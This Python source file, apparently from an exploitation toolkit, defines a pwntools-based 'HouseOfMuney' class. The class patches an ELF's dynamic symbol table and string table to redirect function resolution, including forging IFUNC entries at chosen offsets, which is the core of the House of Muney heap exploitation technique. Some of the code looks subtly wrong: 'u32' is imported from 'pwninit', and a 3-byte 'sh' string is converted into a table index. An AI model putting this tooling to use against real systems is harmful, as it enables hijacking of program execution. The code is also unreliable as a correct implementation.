from pwn import ELF, flat
from pwninit import u32
from .constants import *


class HouseOfMuney:
    """Exploitation helper for the House of Muney technique.

    This class facilitates dynamic symbol table (`.dynsym`) rewriting
    to hijack function resolution in dynamically linked ELF binaries.
    """

    def __init__(self, elf: ELF):
        """Initialize the HouseOfMuney context.

        Args:
            elf (ELF): The target ELF binary.
        """
        self.elf = elf
        self.payload = self.elf.get_segment_for_address(0).data()
        self.dynsym = self.elf.get_section_by_name(".dynsym")
        self.gnuhash = self.elf.get_section_by_name(".gnu.hash")

    def strtab(self) -> int:
        """Get the offset to the string table."""
        return self.dynsym.stringtable.header["sh_offset"]

    def symbol_offset(self, name: str | bytes) -> int:
        """Locate the exact binary offset of a specific symbol inside `.dynsym`.

        Args:
            name (str | bytes): The name of the symbol to find.

        Returns:
            int: The absolute offset, or -1 if not found.
        """
        sym = self.get_sym(name)
        if sym is None:
            return -1

        p = flat(self.dynsym.structs.Elf_Sym.build(sym))
        offset = self.dynsym.data().find(p)
        if offset == -1:
            return -1
        return self.dynsym.header["sh_offset"] + offset

    def get_sym(self, name: str | bytes):
        """Retrieve the raw symbol entry via the GNU hash table.

        Args:
            name (str | bytes): The target symbol name.
        """
        return self.gnuhash.get_symbol(name).entry

    def set_sym(self, name: str, sym: str):
        """Overwrite an existing symbol entry in the ELF data payload.

        Args:
            name (str | bytes): The symbol name.
            sym: The struct built entry to write back.
        """
        off = self.symbol_offset(name)
        self.write(off, self.dynsym.structs.Elf_Sym.build(sym))

    def set_call(self, name: str, offset: int, data: bytes = b"sh\0"):
        """Hijack a symbol to act as a GNU indirect function (IFUNC) call.

        Args:
            name (str | bytes): The symbol to hijack.
            offset (int): The target execution offset.
            data (bytes): Data to inject into the string table (default: `b"sh\\0"`).
        """
        sym = self.get_sym(name)
        idx = u32(data)
        sym["st_name"] = idx
        sym["st_value"] = offset
        # Note: STT_GNU_IFUNC must be available in your local scope/constants
        sym["st_info"]["type"] = STT_GNU_IFUNC
        self.set_sym(name, sym)
        self.write(self.strtab() + idx, name)
        self.write(self.strtab() + idx + len(name), b"\0")

    def set_offset(self, name: str, offset: int):
        """Directly patch the virtual value offset of a specific symbol.

        Args:
            name (str | bytes): The symbol to patch.
            offset (int): The new offset value.
        """
        sym = self.get_sym(name)
        sym["st_value"] = offset
        self.set_sym(name, sym)

    def write(self, addr: int, data: bytes | str):
        """Patch the internal ELF payload memory representation.

        Args:
            addr (int): The starting address offset.
            data (bytes | str): The raw bytes to write.
        """
        if isinstance(data, str):
            data = data.encode()
        elif not isinstance(data, bytes):
            raise ValueError("Data must be bytes or str")

        if addr < 0 or addr + len(data) > len(self):
            raise IndexError("Write out of bounds")

        self.payload = self.payload[:addr] + data + self.payload[addr + len(data) :]

    def read(self, addr: int, size: int) -> bytes:
        """Read a chunk from the internal ELF payload memory representation.

        Args:
            addr (int): The starting address offset.
            size (int): Amount of bytes to read.
        """
        return self.payload[addr : addr + size]

    def __len__(self):
        return len(bytes(self))

    def __bytes__(self):
        return self.payload
